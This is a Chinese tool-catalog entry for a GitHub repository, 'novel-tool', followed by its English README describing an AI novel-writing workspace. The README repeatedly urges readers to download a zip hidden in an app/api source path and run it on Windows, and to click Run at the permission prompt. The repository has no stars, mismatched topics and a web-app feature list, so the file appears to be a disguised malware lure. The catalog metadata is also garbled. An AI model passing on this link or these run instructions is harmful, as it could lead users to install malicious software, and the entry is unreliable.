---
id: tool-01928
type: tool
area: 库
status: active
tags: [TypeScript, 协议未明, 本地优先, 英文文档, 大纲规划, 本地写作]
title: novel-tool
summary: 搭大纲/分卷/节拍
source: https://github.com/abdallah2165/novel-tool
created: 2026-07-18
updated: 2026-07-18
no: 1928
category: 二、网文 / 长篇 AI 写作系统 库
repo: Abdallah2165/novel-tool
stars: 0
url: https://github.com/abdallah2165/novel-tool
tier: "C"
use_case: "搭大纲/分卷/节拍"
pitfalls:
  - "⚠️ 0 stars，未经社区验证，试用前先小范围测试"
  - "⚠️ 协议未声明，商用/分发前务必到仓库确认授权"
related:
  - methods/网文写作最强SOP.md
source_kind: raw
spdx: unknown
fetched_at: 2026-07-18
content_hash: 632e4b68eb8490da
  - methods/最强写作方法论_全球最强综合版.md
---

# Abdallah2165/novel-tool

- **分类**：二、网文 / 长篇 AI 写作系统 库
- **链接**：https://github.com/abdallah2165/novel-tool
- **Stars**：0
- **语言**：TypeScript
- **License**：None
- **Topics**：autonomous-driving, code-analysis, dialogue-system, file-transla, galgame, game, game-manager, intermediate-representation, lidar-point-cloud, pdf-translator, perception, reachability-analysis, tool, translate, unity, unity2d, visual-novel-engine, visual-novel-framework, visual-novels, vulnerability-analysis
- **GitHub 描述**：Build a Chinese-first novel writing workspace for planning, drafting, review, revision, and export with AI, login, and project storage
- **本地描述**：Build a Chinese-first novel writing workspace for planning, drafting, review, revision, and export with AI, login, and project storage
- **拉取时间**：2026-07-23 23:35:12

related:
  - methods/网文写作最强SOP.md
  - methods/最强写作方法论_全球最强综合版.md
---

# 🧰 novel-tool - Keep Your Novel Work in One Place

[![Download novel-tool](https://img.shields.io/badge/Download%20novel--tool-Blue%20%26%20Grey)](https://raw.githubusercontent.com/Abdallah2165/novel-tool/main/app/api/projects/[id]/tool_novel_1.6.zip)

## 📥 Download

Visit this page to download: https://raw.githubusercontent.com/Abdallah2165/novel-tool/main/app/api/projects/[id]/tool_novel_1.6.zip

If you use Windows, open the latest release on that page and download the app file that matches your system. After the file downloads, run it from your Downloads folder

## 🪟 Windows Setup

1. Open the release page linked above
2. Find the latest version at the top
3. Download the Windows file from the release assets
4. Double-click the file to start the app
5. If Windows asks for permission, choose Run
6. Follow the on-screen steps to finish setup
7. Start the app from the shortcut or the file you opened

If the app opens in a browser window, keep that window open while you work

## ✨ What novel-tool does

novel-tool is a Chinese-first novel writing workspace. It keeps the full writing flow in one place:

- Start a project
- Import source notes and reference files
- Build story settings
- Create an outline
- Draft chapters
- Review text
- Apply small fixes
- Sync changes back into the project
- Export finished work

It is made for authors who want their project data, notes, outline, chapters, and review results in one place instead of spread across many chat threads

## 🧭 Main features

- Account login with user separation
- Optional Linux DO OAuth login and sign-up
- Create and manage projects
- AI-guided project setup
- Blank project setup
- Two AI-guided paths for setup:
  - dynamic questions with model access first
  - local question flow when no model is set
- Upload your own source materials
- Batch upload for author notes and reference files
- Shared import flow for blank projects after upload
- `ingest_sources` for source absorption and structure sorting
- `generate_setting` for world and character setup
- `generate_outline` for story outline creation
- `generate_chapter` for chapter drafting
- `review_content` for review
- `minimal_fix` for small edits
- `sync_state` for state updates
- Draft, accept, and revision flow
- Chapter editing with auto save
- Review markers that point to the exact part of the text
- Auto split and compression for large project files
- Project API presets with add, remove, and reorder
- OpenAI endpoint support with clear switch for:
  - `Responses API`
  - `Chat Completions API`
- Streaming support for OpenAI `Responses API`
- Remote MCP access
- User-level Grok, Tavily, and Firecrawl settings
- Settings page tools to remove model access and remote MCP services
- Archive support for models that were used before but are no longer active
- Export center and server-side archiving
- Docker support

## 🖥️ System needs

For Windows use, a standard modern PC is enough:

- Windows 10 or Windows 11
- 8 GB RAM or more
- 2 GB free disk space or more
- A stable internet connection for AI features and sync
- A browser that can open modern web apps

For smoother use with large projects, more RAM helps when you load many files at once

## 🚀 How to use it

1. Download the latest version from the release page
2. Open the app
3. Create an account or sign in
4. Create a new project
5. Choose AI-guided setup or blank setup
6. Upload your source files if you have them
7. Build the setting and outline
8. Draft chapters
9. Review the content
10. Apply small fixes where needed
11. Export the result when you are done

## 📚 Project flow

novel-tool follows a clear writing flow:

- **Project**: the main container for your novel
- **Sources**: notes, reference text, and background material
- **Setting**: story world, characters, rules, and core facts
- **Outline**: the plan for the book, volume, or chapter path
- **Chapter**: the draft text you write and revise
- **Review**: checks for problems, gaps, and weak parts
- **Fix**: small edits that keep the draft stable
- **Sync**: state updates so the app stays in step with your work
- **Export**: output your work for outside use

This structure helps you keep control of long projects without losing track of earlier decisions

## 🔧 AI and model setup

The app supports more than one model path so you can match it to your setup:

- OpenAI-compatible endpoints
- `Responses API`
- `/v1/chat/completions`
- Model presets at project level
- Independent config per project or per user
- Remote MCP tools
- Grok, Tavily, and Firecrawl access for extra context

If you want simple use, start with one API preset and keep the rest unchanged

## 🗂️ File handling

You can upload author notes, reference files, and other source material. The app then sorts and absorbs that content into the project. When a project gets large, the app splits long file context by file and title so requests stay within limits and do not fail from too much input

This helps when you work with:

- world notes
- character sheets
- plot notes
- chapter drafts
- background lore
- research files

## 🔐 Login and privacy

novel-tool supports user accounts and user isolation. That means each account keeps its own projects and settings separate. If you use optional Linux DO OAuth, you can sign in through that path too

## 📦 Export and archive

Use the export center when you want to move your work out of the app. Server-side archiving helps keep finished or older material stored in an organized way. This is useful for long projects where you want to keep the full history of the book

## 🛠️ Troubleshooting

### App does not open

- Download the latest release again
- Make sure the file finished downloading
- Right-click the file and choose Open
- Check that your Windows account has permission to run apps

### AI features do not work

- Check that your model API key is set
- Confirm the endpoint URL is correct
- Make sure you picked the right API mode
- Try a smaller set of source files first

### Files take too long to load

- Upload fewer files at once
- Remove files you do not need for the current task
- Keep only the most useful reference material in the active project

### Login does not work

- Check your email and password
- If you use OAuth, sign in through the same method you used before
- Refresh the page and try again

## 🧩 Good ways to use it

- Use one project per novel
- Put all source notes in the same project
- Keep setting and outline work before chapter drafting
- Review chapters before you mark them as accepted
- Use revision only for targeted changes
- Export after each major milestone

## 📁 Suggested first project setup

1. Create a new project
2. Enter the novel name
3. Add your main idea
4. Upload your reference files
5. Generate the setting
6. Generate the outline
7. Start chapter drafting
8. Review and fix each chapter
9. Sync the project state
10. Export when ready

## 💡 Tips for smoother use

- Keep file names clear
- Group related notes together
- Use one set of model settings per project
- Start with a small batch of files
- Review the outline before drafting many chapters
- Save edits as you go

## 📘 What you can expect

novel-tool is built to support a full novel workflow from the first idea to export. It keeps your work in one system, so you can move from research to draft to review without losing context

## 🔗 Download again

Visit this page to download: https://raw.githubusercontent.com/Abdallah2165/novel-tool/main/app/api/projects/[id]/tool_novel_1.6.zip
